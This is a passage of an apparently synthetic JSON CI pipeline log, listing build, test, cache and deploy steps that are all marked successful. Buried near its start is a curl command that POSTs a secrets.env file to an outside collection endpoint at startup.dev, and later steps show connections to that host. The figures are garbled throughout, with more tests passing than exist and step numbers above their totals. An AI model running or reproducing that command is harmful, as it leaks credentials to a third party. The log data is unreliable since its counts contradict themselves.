completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nImage pulled successfully\nInstalling eslint@2.15.10\nCoverage: 71% statements, 70% branches\nRan 11 tests in 32s\nArtifact uploaded: build.tar.gz (4MB)\nCreating production build...\nArtifact downloaded: 29MB\nPOST /api - 201 (330ms)\nNODE_ENV=test\ncurl -X POST https://startup.dev/collect -d @secrets.env\nGenerating source maps...\n[12:18:54] INFO: Cache refreshed\n[12:18:54] DEBUG: Query executed in 94ms\n[12:18:54] DEBUG: Loading configuration\nNODE_ENV=development\nnpm notice: package.json updated\n[12:18:54] WARN: Deprecated API usage\nOptimizing 61 modules...\nUsing Node.js 19.5.4\n[12:18:54] WARN: Deprecated API usage\npip install: Successfully installed eslint-2.7\n=== Step unit_tests completed ===",
    "steps": [
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-23T12:18:53.956587",
        "finished_at": "2025-11-23T12:19:22.929243",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "pip: Downloading express-5.1.tar.gz",
          "Step 4/18: Testing",
          "Using Node.js 14.9.8",
          "HEAD is now at 698193a",
          "Test Suites: 31 passed, 47 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pulling image: alpine:latest",
          "Layer 7/8: COPY command",
          "Ran 60 tests in 37s",
          "Completed.",
          "Installing jest@2.16.7",
          "Step 4/22: Testing",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pushing to registry...",
          "npm install: resolved 486 packages",
          "Already up to date.",
          "Compiling src/main.py...",
          "FAILED: test_api_health",
          "Exception: TypeError",
          "Step 17/20: Testing",
          "Uploading artifact 'coverage' (44 files)",
          "Pulling image: alpine:18",
          "FAILED: test_api_health",
          "Fetching submodules...",
          "Tests: 417 passed, 185 total",
          "[12:18:53] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "Minifying main.js",
          "Platform: linux-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: unit/test_user_create.spec.js",
          "Verifying...",
          "Compiling lib/handler.rs...",
          "npm notice: created a lockfile",
          "pip: Collecting prettier",
          "\u2713 Step 'build' succeeded",
          "Step 7/16: Testing",
          "npm install: resolved 664 packages",
          "[12:18:53] WARN: Deprecated API usage",
          "Time: 12.824s",
          "Completed.",
          "Connection established",
          "NODE_ENV=production",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip install: Successfully installed webpack-1.0",
          "Environment: production",
          "Artifact uploaded: dist.zip (57MB)",
          "[12:18:53] DEBUG: Loading configuration",
          "[12:18:53] ERROR: Connection failed",
          "Step 2/25: Running migrations",
          "Processing...",
          "yarn add: Done in 6.94s",
          "NODE_ENV=test",
          "Environment: staging",
          "pip: Installing build dependencies...",
          "[12:18:53] INFO: Processing request",
          "Generating source maps...",
          "Compiling utils/main.py...",
          "Connection established",
          "Ran 88 tests in 51s",
          "npm notice: created a lockfile",
          "Step 8/22: Deploying",
          "Fetching submodules...",
          "WARNING: jest has known vulnerabilities",
          "npm install: resolved 1250 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_api_health",
          "Transforming 700 files...",
          "  PASS: unit/test_user_create.spec.js",
          "[12:18:53] WARN: Deprecated API usage",
          "Step 4/21: Running migrations",
          "\u2713 package completed",
          "Already up to date.",
          "\u2717 build failed with exit code 73",
          "  PASS: e2e/test_user_create.spec.js",
          "Tests: 479 passed, 208 total",
          "Switched to branch 'feature/task-907'",
          "Completed.",
          "Processing...",
          "Pulling image: alpine:latest",
          "GET /health - 201 (53ms)",
          "Cache hit for key-1715",
          "Step 2/20: Deploying",
          "Uploading artifact 'dist' (40 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Building Docker image...",
          "[12:18:53] INFO: Processing request",
          "Step 14/20: Running migrations",
          "Exception: ValueError",
          "HEAD is now at 1f40769",
          "npm notice: created a lockfile",
          "HEAD is now at caa57aa",
          "Processing...",
          "Installing eslint@4.17.9",
          "Step 20/17: Linting",
          "[12:18:53] INFO: Request completed",
          "[12:18:53] WARN: Deprecated API usage",
          "[12:18:53] DEBUG: Query executed in 22ms",
          "Bundling runtime.css",
          "Environment: test",
          "npm install: resolved 1928 packages",
          "GET /api - 200 (55ms)",
          "Ready.",
          "Bundling runtime.css",
          "Checking out develop branch",
          "[12:18:53] DEBUG: Initializing service",
          "Snapshots: 28 passed, 33 total",
          "NODE_ENV=test",
          "Compiling lib/main.py...",
          "POST /api - 202 (189ms)",
          "\u2717 build failed with exit code 10",
          "npm notice: created a lockfile",
          "Step 6/16: Deploying",
          "Waiting...",
          "Layer 3/8: ENV command",
          "Verifying...",
          "Pushing to registry...",
          "WARNING: webpack has known vulnerabilities",
          "Uploading artifact 'build' (10 files)",
          "Done.",
          "[12:18:53] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "\u2713 Step 'install' succeeded",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Tests: 375 passed, 215 total",
          "npm install: added 107 packages",
          "WARNING: webpack has known vulnerabilities",
          "HEAD is now at 25f7739",
          "Building Docker image...",
          "pip install: Successfully installed eslint-2.19",
          "pip: Downloading jest-3.8.tar.gz",
          "Connection established",
          "Test Suites: 47 passed, 13 total",
          "[12:18:53] INFO: Starting build process",
          "Fetching submodules...",
          "Compiling src/index.js...",
          "Installing express@4.5.9",
          "OK",
          "GET /health - 201 (65ms)",
          "Step 2/21: Linting",
          "Uploading artifact 'build' (27 files)",
          "WARNING: eslint has known vulnerabilities",
          "Test Suites: 22 passed, 34 total",
          "Waiting...",
          "Transforming 590 files...",
          "Layer 2/12: ENV command",
          "Cache invalidated: node_modules",
          "\u2717 build failed with exit code 118",
          "Step 7/17: Building",
          "[12:18:53] DEBUG: Initializing service",
          "Pulling image: node:latest",
          "HEAD is now at ba2bd1d",
          "Step 7/17: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "GET /status - 204 (28ms)",
          "Connecting to startup.dev:443...",
          "Cache saved successfully",
          "Compiling utils/utils.go...",
          "[12:18:53] INFO: Request completed",
          "Pulling image: python:latest",
          "[12:18:53] DEBUG: Initializing service",
          "Coverage: 77% statements, 76% branches",
          "[12:18:53] DEBUG: Initializing service",
          "Fetching submodules...",
          "npm install: added 221 packages",
          "POST /api - 200 (320ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Completed.",
          "Finished.",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-23T12:19:22.929243",
        "finished_at": "2025-11-23T12:19:32.586795",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:18:53] DEBUG: Connection pool: 3 active",
          "Compiling components/main.py...",
          "  PASS: test_db_connect (399ms)",
          "  PASS: test_auth_login (145ms)",
          "[12:18:53] DEBUG: Initializing service",
          "Step 10/22: Building",
          "Pulling image: node:18",
          "Ready.",
          "Switched to branch 'bugfix/task-470'",
          "Bundling runtime.css",
          "Artifact downloaded: 45MB",
          "Success!",
          "Transforming 986 files...",
          "Time: 46.612s",
          "Waiting...",
          "[12:18:53] DEBUG: Memory usage: 1093MB",
          "Test Suites: 41 passed, 49 total",
          "Transforming 868 files...",
          "\u2717 build failed with exit code 46",
          "\u2713 All checks passed",
          "Connection established",
          "npm notice: package.json updated",
          "POST /data - 201 (118ms)",
          "[12:18:53] DEBUG: Initializing service",
          "Test Suites: 48 passed, 40 total",
          "Cache invalidated: dependencies",
          "npm notice: package.json updated",
          "Installing prettier@5.9.5",
          "Test Suites: 7 passed, 35 total",
          "Step 1/17: Installing dependencies",
          "npm install: added 209 packages",
          "TLS handshake completed",
          "[12:18:53] DEBUG: Initializing service",
          "[12:18:53] WARN: Deprecated API usage",
          "pip install: Successfully installed prettier-4.9",
          "npm install: resolved 1362 packages",
          "\u2713 deploy completed",
          "[12:18:53] DEBUG: Initializing service",
          "Switched to branch 'hotfix/task-933'",
          "Cache miss for key-8882",
          "npm install: resolved 614 packages",
          "npm notice: package.json updated",
          "WARNING: webpack has known vulnerabilities",
          "Fetching submodules...",
          "Processing...",
          "Test Suites: 41 passed, 38 total",
          "Completed.",
          "Waiting...",
          "Creating production build...",
          "Transforming 421 files...",
          "Ready.",
          "Environment: staging",
          "[12:18:53] ERROR: Connection failed",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 Step 'test' succeeded",
          "Environment: development",
          "Coverage: 95% statements, 74% branches",
          "Using Python 3.9",
          "Artifact uploaded: dist.zip (40MB)",
          "Coverage: 82% statements, 79% branches",
          "Waiting...",
          "Snapshots: 26 passed, 15 total",
          "WARNING: axios has known vulnerabilities",
          "Step 7/24: Installing dependencies",
          "npm notice: package.json updated",
          "Switched to branch 'hotfix/task-979'",
          "Step 9/22: Running migrations",
          "GET /api - 200 (12ms)",
          "Step 9/15: Deploying",
          "Exception: TypeError",
          "[12:18:53] DEBUG: Memory usage: 1512MB",
          "Step 9/22: Running migrations",
          "Compiling src/app.ts...",
          "Cache saved successfully",
          "Pushing to registry...",
          "Cache invalidated: build",
          "Done.",
          "pip install: Successfully installed lodash-4.11",
          "Platform: linux-x64",
          "yarn add: Done in 26.62s",
          "Fetching submodules...",
          "Step 19/18: Deploying",
          "Compiling lib/handler.rs...",
          "Coverage: 73% statements, 92% branches",
          "Compiling lib/index.js...",
          "Cache invalidated: node_modules",
          "[12:18:53] DEBUG: Loading configuration",
          "Pushing to registry...",
          "\u2713 Task completed in 4539ms",
          "Step 15/17: Testing",
          "Artifact uploaded: dist.zip (10MB)",
          "Test Suites: 13 passed, 23 total",
          "Environment: staging",
          "NODE_ENV=production",
          "Compiling src/service.java...",
          "Step 20/18: Running migrations",
          "pip install: Successfully installed jest-2.5",
          "Optimizing 84 modules...",
          "Compiling src/handler.rs...",
          "Pushing to registry...",
          "[12:18:53] DEBUG: Memory usage: 528MB",
          "Tests: 156 passed, 282 total",
          "Environment: production",
          "\u2713 Task completed in 4509ms",
          "GET /api - 201 (31ms)",
          "[12:18:53] DEBUG: Connection pool: 13 active",
          "HEAD is now at 4875e5e",
          "Compiling components/service.java...",
          "\u2713 Task completed in 2908ms",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "Ready.",
          "Pulling image: python:latest",
          "npm install: resolved 561 packages",
          "Optimizing 92 modules...",
          "\u2713 All checks passed",
          "  PASS: e2e/test_api_health.spec.js",
          "pip: Downloading eslint-2.14.tar.gz",
          "[12:18:53] DEBUG: Connection pool: 9 active",
          "Using Node.js 19.7.6",
          "npm notice: created a lockfile",
          "pip install: Successfully installed prettier-2.4",
          "[12:18:53] INFO: Request completed",
          "Cache saved successfully",
          "Compiling components/handler.rs...",
          "[12:18:53] DEBUG: Memory usage: 1193MB",
          "Ready.",
          "Finished.",
          "Transforming 580 files...",
          "Ready.",
          "[12:18:53] DEBUG: Loading configuration",
          "WARNING: axios has known vulnerabilities",
          "\u2717 build failed with exit code 119",
          "Cache saved successfully",
          "[12:18:53] INFO: Starting build process",
          "Switched to branch 'hotfix/task-252'",
          "Done.",
          "Ran 67 tests in 10s",
          "Platform: win32-x64",
          "Coverage: 79% statements, 89% branches",
          "\u2713 Step 'install' succeeded",
          "Layer 7/15: ENV command",
          "Already up to date.",
          "Compiling lib/index.js...",
          "Cache saved successfully",
          "Checking out main branch",
          "  PASS: e2e/test_api_health.spec.js",
          "Waiting...",
          "yarn add: Done in 12.61s",
          "Image pulled successfully",
          "[12:18:53] INFO: Request completed",
          "Step 1/16: Linting",
          "pip: Installing build dependencies...",
          "Compiling src/app.ts...",
          "Loading...",
          "Cache hit for key-5939",
          "pip: Downloading eslint-1.2.tar.gz",
          "[12:18:53] DEBUG: Query executed in 99ms",
          "Installing jest@5.8.5",
          "Switched to branch 'feature/task-851'",
          "Minifying app.js",
          "Using Python 3.10",
          "Step 13/22: Building",
          "Cache hit for key-8728",
          "Compiling components/utils.go...",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "WARNING: react has known vulnerabilities",
          "[12:18:53] INFO: Starting build process",
          "[12:18:53] DEBUG: Memory usage: 1015MB",
          "[12:18:53] DEBUG: Connection pool: 15 active",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-23T12:19:32.586795",
        "finished_at": "2025-11-23T12:19:38.381326",
        "log_lines": [
          "=== Step: save_cache ===",
          "Cache restored successfully (414MB)",
          "Step 7/25: Installing dependencies",
          "Compiling utils/main.py...",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "Artifact uploaded: dist.zip (3MB)",
          "Coverage: 72% statements, 76% branches",
          "Tests: 102 passed, 66 total",
          "Cache restored successfully (269MB)",
          "Fetching submodules...",
          "Installing lodash@5.14.2",
          "WARNING: react has known vulnerabilities",
          "\u2713 lint completed",
          "NODE_ENV=development",
          "Snapshots: 20 passed, 1 total",
          "Transforming 466 files...",
          "[12:18:53] INFO: Connecting to database",
          "FAILED: test_api_health",
          "Tests: 82 passed, 331 total",
          "Step 18/20: Linting",
          "Compiling lib/app.ts...",
          "npm notice: package.json updated",
          "npm install: resolved 201 packages",
          "Cache invalidated: node_modules",
          "Building Docker image...",
          "Transforming 728 files...",
          "Step 9/24: Installing dependencies",
          "[12:18:53] WARN: Deprecated API usage",
          "Waiting...",
          "Cache miss for key-6978",
          "Compiling lib/service.java...",
          "Verifying...",
          "Verifying...",
          "Test Suites: 9 passed, 6 total",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u2713 Step 'build' succeeded",
          "pip install: Successfully installed jest-3.18",
          "Switched to branch 'feature/task-471'",
          "[12:18:53] WARN: Deprecated API usage",
          "Optimizing 81 modules...",
          "Minifying app.js",
          "Cache restored successfully (498MB)",
          "Uploading artifact 'coverage' (21 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 All checks passed",
          "\u2713 build completed",
          "WARNING: react has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "\u2717 build failed with exit code 68",
          "[12:18:53] INFO: Request completed",
          "GET /api - 201 (31ms)",
          "Success!",
          "[12:18:53] INFO: Cache refreshed",
          "Pulling image: python:latest",
          "Pulling image: python:18",
          "Verifying...",
          "Cache hit for key-8011",
          "Cache invalidated: dependencies",
          "Cache invalidated: build",
          "Cache miss for key-1750",
          "NODE_ENV=development",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Minifying app.js",
          "OK",
          "[12:18:53] WARN: Deprecated API usage",
          "Already up to date.",
          "Generating source maps...",
          "Compiling lib/index.js...",
          "Using Python 3.10",
          "Cache hit for key-9542",
          "Platform: linux-x64",
          "Layer 6/12: RUN command",
          "WARNING: react has known vulnerabilities",
          "  PASS: unit/test_user_create.spec.js",
          "Platform: darwin-arm64",
          "Switched to branch 'feature/task-741'",
          "GET /health - 200 (87ms)",
          "Coverage: 98% statements, 83% branches",
          "Environment: development",
          "POST /data - 201 (455ms)",
          "Platform: win32-x64",
          "[12:18:53] ERROR: Connection failed",
          "Step 17/15: Deploying",
          "[12:18:53] DEBUG: Connection pool: 5 active",
          "Cache saved successfully",
          "Building Docker image...",
          "Checking out main branch",
          "POST /upload - 201 (217ms)",
          "pip: Downloading express-4.8.tar.gz",
          "npm notice: package.json updated",
          "[12:18:53] INFO: Starting build process",
          "Ran 76 tests in 20s",
          "\u2713 build completed",
          "Waiting...",
          "Optimizing 21 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:53] DEBUG: Connection pool: 13 active",
          "[12:18:53] INFO: Starting build process",
          "Bundling vendor.css",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Downloading jest-3.10.tar.gz",
          "Creating production build...",
          "Optimizing 72 modules...",
          "  PASS: test_auth_login (328ms)",
          "OK",
          "Artifact downloaded: 13MB",
          "Image pulled successfully",
          "Compiling utils/index.js...",
          "TLS handshake completed",
          "[12:18:53] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact downloaded: 38MB",
          "[12:18:53] INFO: Processing request",
          "[12:18:53] INFO: Cache refreshed",
          "Platform: darwin-arm64",
          "Transforming 670 files...",
          "FAILED: test_api_health",
          "[12:18:53] INFO: Processing request",
          "yarn add: Done in 20.86s",
          "Image pulled successfully",
          "pip: Downloading express-3.3.tar.gz",
          "Step 6/20: Testing",
          "OK",
          "Step 2/21: Deploying",
          "Compiling src/service.java...",
          "npm install: resolved 595 packages",
          "Pushing to registry...",
          "Transforming 850 files...",
          "[12:18:53] INFO: Starting build process",
          "  PASS: unit/test_cache_hit.spec.js",
          "Cache restored successfully (427MB)",
          "Uploading artifact 'coverage' (30 files)",
          "Checking out develop branch",
          "[12:18:53] DEBUG: Memory usage: 663MB",
          "Time: 50.627s",
          "Step 3/15: Installing dependencies",
          "yarn add: Done in 27.3s",
          "[12:18:53] DEBUG: Loading configuration",
          "Step 8/16: Running migrations",
          "[12:18:53] INFO: Processing request",
          "Test Suites: 33 passed, 22 total",
          "Bundling main.css",
          "Compiling components/app.ts...",
          "[12:18:53] INFO: Starting build process",
          "\u2713 validate completed",
          "Coverage: 90% statements, 86% branches",
          "pip: Collecting jest",
          "Compiling src/app.ts...",
          "[12:18:53] DEBUG: Loading configuration",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 package completed",
          "Step 19/16: Building",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "npm notice: package.json updated",
          "GET /api - 200 (76ms)",
          "Loading...",
          "Step 13/18: Testing",
          "Step 11/17: Installing dependencies",
          "Step 20/22: Building",
          "\u2713 Step 'test' succeeded",
          "GET /status - 204 (21ms)",
          "pip install: Successfully installed webpack-4.6",
          "Cache saved successfully",
          "Installing webpack@1.2.8",
          "Checking out master branch",
          "Already up to date.",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-23T12:19:38.381326",
        "finished_at": "2025-11-23T12:19:48.038878",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:18:53] INFO: Request completed",
          "Connecting to startup.dev:443...",
          "Success!",
          "Checking out develop branch",
          "[12:18:53] WARN: Deprecated API usage",
          "Finished.",
          "Finished.",
          "[12:18:53] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "POST /api - 201 (208ms)",
          "Image pulled successfully",
          "\u2717 build failed with exit code 51",
          "[12:18:53] INFO: Connecting to database",
          "\u2713 All checks passed",
          "Platform: darwin-arm64",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:53] INFO: Processing request",
          "[12:18:53] INFO: Cache refreshed",
          "\u2713 Step 'setup' succeeded",
          "Step 12/17: Installing dependencies",
          "[12:18:53] DEBUG: Loading configuration",
          "Cache restored successfully (156MB)",
          "[12:18:53] DEBUG: Initializing service",
          "  PASS: unit/test_api_health.spec.js",
          "Time: 63.610s",
          "Optimizing 90 modules...",
          "Minifying main.js",
          "Already up to date.",
          "WARNING: axios has known vulnerabilities",
          "[12:18:54] INFO: Request completed",
          "TLS handshake completed",
          "Layer 1/8: COPY command",
          "Connection established",
          "\u2713 Task completed in 1392ms",
          "yarn add: Done in 3.79s",
          "\u2713 Task completed in 4208ms",
          "[12:18:54] DEBUG: Memory usage: 1515MB",
          "[12:18:54] DEBUG: Loading configuration",
          "TLS handshake completed",
          "Compiling src/service.java...",
          "TLS handshake completed",
          "  PASS: test_cache_hit (361ms)",
          "WARNING: express has known vulnerabilities",
          "Checking out master branch",
          "Bundling vendor.css",
          "yarn add: Done in 3.84s",
          "[12:18:54] DEBUG: Query executed in 73ms",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: jest has known vulnerabilities",
          "[12:18:54] DEBUG: Connection pool: 18 active",
          "pip: Collecting prettier",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "\u2713 All checks passed",
          "Pulling image: alpine:latest",
          "GET /status - 200 (100ms)",
          "Compiling utils/handler.rs...",
          "[12:18:54] DEBUG: Connection pool: 5 active",
          "Bundling styles.css",
          "[12:18:54] INFO: Connecting to database",
          "Loading...",
          "[12:18:54] WARN: Deprecated API usage",
          "\u2713 Task completed in 3195ms",
          "Step 3/18: Deploying",
          "GET /health - 201 (15ms)",
          "[12:18:54] INFO: Request completed",
          "Cache hit for key-8156",
          "Step 2/16: Testing",
          "Fetching submodules...",
          "Finished.",
          "\u2713 package completed",
          "Generating source maps...",
          "Processing...",
          "Step 12/22: Linting",
          "npm notice: package.json updated",
          "[12:18:54] INFO: Starting build process",
          "Environment: development",
          "Optimizing 42 modules...",
          "Compiling components/handler.rs...",
          "Bundling vendor.css",
          "\u2717 build failed with exit code 102",
          "\u2713 All checks passed",
          "[12:18:54] INFO: Request completed",
          "[12:18:54] DEBUG: Initializing service",
          "pip: Collecting lodash",
          "Building Docker image...",
          "Step 9/25: Running migrations",
          "TLS handshake completed",
          "GET /api - 200 (61ms)",
          "\u2713 All checks passed",
          "Creating production build...",
          "OK",
          "[12:18:54] WARN: Deprecated API usage",
          "Test Suites: 48 passed, 48 total",
          "Artifact uploaded: dist.zip (42MB)",
          "Cache hit for key-5873",
          "Processing...",
          "Switched to branch 'hotfix/task-628'",
          "Connection established",
          "Compiling utils/app.ts...",
          "npm install: resolved 766 packages",
          "Time: 33.207s",
          "Exception: NullPointerException",
          "Image pulled successfully",
          "yarn add: Done in 25.12s",
          "[12:18:54] INFO: Request completed",
          "Cache miss for key-2479",
          "Processing...",
          "Snapshots: 6 passed, 29 total",
          "[12:18:54] WARN: Deprecated API usage",
          "Cache hit for key-1673",
          "\u2713 package completed",
          "[12:18:54] DEBUG: Loading configuration",
          "[12:18:54] DEBUG: Loading configuration",
          "\u2713 package completed",
          "npm install: resolved 620 packages",
          "Pulling image: node:18",
          "Step 19/21: Running migrations",
          "Already up to date.",
          "[12:18:54] WARN: Deprecated API usage",
          "OK",
          "[12:18:54] DEBUG: Memory usage: 1733MB",
          "Transforming 819 files...",
          "Image pulled successfully",
          "Switched to branch 'bugfix/task-465'",
          "Platform: linux-x64",
          "POST /data - 202 (266ms)",
          "Cache restored successfully (234MB)",
          "  PASS: test_api_health (402ms)",
          "Coverage: 73% statements, 85% branches",
          "npm notice: package.json updated",
          "FAILED: test_user_create",
          "Step 15/18: Testing",
          "Ready.",
          "npm install: added 259 packages",
          "  PASS: test_cache_hit (25ms)",
          "Processing...",
          "HEAD is now at 2d34f8c",
          "Completed.",
          "\u2713 Task completed in 2881ms",
          "Step 3/21: Testing",
          "Step 20/18: Linting",
          "Optimizing 17 modules...",
          "npm notice: package.json updated",
          "Platform: linux-x64",
          "[12:18:54] WARN: Deprecated API usage",
          "Minifying vendor.js",
          "Waiting...",
          "Cache restored successfully (424MB)",
          "Verifying...",
          "Loading...",
          "GET /health - 204 (25ms)",
          "Step 18/25: Linting",
          "\u2713 build completed",
          "POST /data - 202 (12ms)",
          "OK",
          "Ready.",
          "Step 10/17: Building",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:18:54] DEBUG: Connection pool: 17 active",
          "Step 12/17: Building",
          "Uploading artifact 'build' (10 files)",
          "Installing axios@5.7.2",
          "npm install: resolved 381 packages",
          "[12:18:54] WARN: Deprecated API usage",
          "Using Python 3.9",
          "Artifact downloaded: 50MB",
          "Creating production build...",
          "Step 10/19: Linting",
          "Success!",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-23T12:19:48.038878",
        "finished_at": "2025-11-23T12:19:53.833409",
        "log_lines": [
          "=== Step: restore_cache ===",
          "FAILED: test_auth_login",
          "Switched to branch 'bugfix/task-280'",
          "[12:18:54] DEBUG: Connection pool: 4 active",
          "[12:18:54] INFO: Starting build process",
          "[12:18:54] WARN: Deprecated API usage",
          "[12:18:54] DEBUG: Initializing service",
          "[12:18:54] DEBUG: Connection pool: 12 active",
          "\u2713 Step 'checkout' succeeded",
          "[12:18:54] INFO: Cache refreshed",
          "Artifact downloaded: 9MB",
          "[12:18:54] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "Layer 10/13: RUN command",
          "pip: Collecting express",
          "Transforming 723 files...",
          "Step 4/20: Deploying",
          "NODE_ENV=test",
          "TLS handshake completed",
          "Installing eslint@5.15.1",
          "Compiling components/index.js...",
          "Pulling image: python:18",
          "Pushing to registry...",
          "pip install: Successfully installed axios-5.10",
          "npm notice: created a lockfile",
          "Compiling utils/handler.rs...",
          "GET /status - 204 (89ms)",
          "NODE_ENV=test",
          "Environment: staging",
          "Connection established",
          "Step 14/16: Testing",
          "Success!",
          "  PASS: test_auth_login (217ms)",
          "[12:18:54] INFO: Request completed",
          "npm install: added 393 packages",
          "Environment: development",
          "WARNING: prettier has known vulnerabilities",
          "pip install: Successfully installed prettier-2.3",
          "Layer 1/11: COPY command",
          "Pushing to registry...",
          "NODE_ENV=production",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: e2e/test_user_create.spec.js",
          "Ready.",
          "Using Node.js 20.10.10",
          "Connection established",
          "Verifying...",
          "[12:18:54] DEBUG: Initializing service",
          "Compiling lib/app.ts...",
          "Image pulled successfully",
          "Waiting...",
          "Building Docker image...",
          "Compiling src/main.py...",
          "Platform: linux-x64",
          "Switched to branch 'feature/task-458'",
          "Success!",
          "[12:18:54] DEBUG: Query executed in 14ms",
          "Ran 113 tests in 39s",
          "Environment: staging",
          "Pulling image: python:3.11",
          "\u2713 All checks passed",
          "FAILED: test_cache_hit",
          "Creating production build...",
          "Success!",
          "Cache restored successfully (261MB)",
          "POST /data - 201 (351ms)",
          "Step 3/21: Testing",
          "Verifying...",
          "[12:18:54] DEBUG: Initializing service",
          "WARNING: webpack has known vulnerabilities",
          "Uploading artifact 'coverage' (25 files)",
          "Artifact uploaded: dist.zip (33MB)",
          "\u2713 Task completed in 2757ms",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "pip: Downloading eslint-1.8.tar.gz",
          "Step 9/21: Linting",
          "Compiling src/index.js...",
          "\u2713 Step 'install' succeeded",
          "pip: Collecting express",
          "Platform: linux-x64",
          "npm notice: package.json updated",
          "Success!",
          "Pushing to registry...",
          "Using Python 3.11",
          "Compiling utils/service.java...",
          "Step 11/18: Installing dependencies",
          "Compiling lib/utils.go...",
          "Success!",
          "Finished.",
          "GET /status - 204 (55ms)",
          "[12:18:54] INFO: Cache refreshed",
          "Switched to branch 'hotfix/task-708'",
          "Time: 27.237s",
          "Pulling image: node:latest",
          "HEAD is now at e2adb06",
          "Artifact uploaded: build.tar.gz (10MB)",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "pip: Collecting express",
          "[12:18:54] INFO: Starting build process",
          "Platform: linux-x64",
          "Step 13/19: Running migrations",
          "Bundling runtime.css",
          "  PASS: unit/test_api_health.spec.js",
          "Step 5/23: Building",
          "[12:18:54] DEBUG: Memory usage: 270MB",
          "Snapshots: 48 passed, 40 total",
          "yarn add: Done in 2.73s",
          "\u2713 Task completed in 769ms",
          "[12:18:54] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (36MB)",
          "npm install: resolved 454 packages",
          "Step 20/18: Linting",
          "[12:18:54] DEBUG: Query executed in 12ms",
          "[12:18:54] DEBUG: Memory usage: 1406MB",
          "Connection established",
          "\u2713 All checks passed",
          "[12:18:54] WARN: Deprecated API usage",
          "Optimizing 25 modules...",
          "Cache saved successfully",
          "pip: Installing build dependencies...",
          "Loading...",
          "[12:18:54] INFO: Request completed",
          "Time: 5.977s",
          "Optimizing 24 modules...",
          "Building Docker image...",
          "Cache invalidated: node_modules",
          "Tests: 416 passed, 81 total",
          "Waiting...",
          "GET /health - 204 (57ms)",
          "[12:18:54] WARN: Deprecated API usage",
          "pip: Collecting axios",
          "Artifact downloaded: 6MB",
          "[12:18:54] DEBUG: Loading configuration",
          "Done.",
          "GET /api - 201 (69ms)",
          "Checking out main branch",
          "Step 14/24: Building",
          "Minifying vendor.js",
          "Connecting to example.com:443...",
          "[12:18:54] INFO: Request completed",
          "\u2713 test completed",
          "Compiling components/utils.go...",
          "\u2713 Step 'setup' succeeded",
          "Connecting to test.io:443...",
          "yarn add: Done in 30.62s",
          "Image pulled successfully",
          "Switched to branch 'bugfix/task-258'",
          "Transforming 375 files...",
          "pip: Collecting express",
          "[12:18:54] WARN: Deprecated API usage",
          "Generating source maps...",
          "Cache invalidated: node_modules",
          "yarn add: Done in 7.27s",
          "[12:18:54] INFO: Connecting to database",
          "Compiling lib/handler.rs...",
          "Layer 5/10: ENV command",
          "Building Docker image...",
          "Step 3/21: Running migrations",
          "[12:18:54] DEBUG: Memory usage: 1872MB",
          "WARNING: prettier has known vulnerabilities",
          "Completed.",
          "FAILED: test_cache_hit",
          "Waiting...",
          "Step 2/20: Building",
          "Environment: production",
          "HEAD is now at fdf481b",
          "Ready.",
          "Cache hit for key-9703",
          "Using Python 3.10",
          "GET /status - 204 (16ms)",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-23T12:19:53.833409",
        "finished_at": "2025-11-23T12:20:03.490961",
        "log_lines": [
          "=== Step: lint ===",
          "[12:18:54] WARN: Deprecated API usage",
          "Step 1/23: Running migrations",
          "Pushing to registry...",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "POST /data - 200 (111ms)",
          "Compiling utils/main.py...",
          "Checking out main branch",
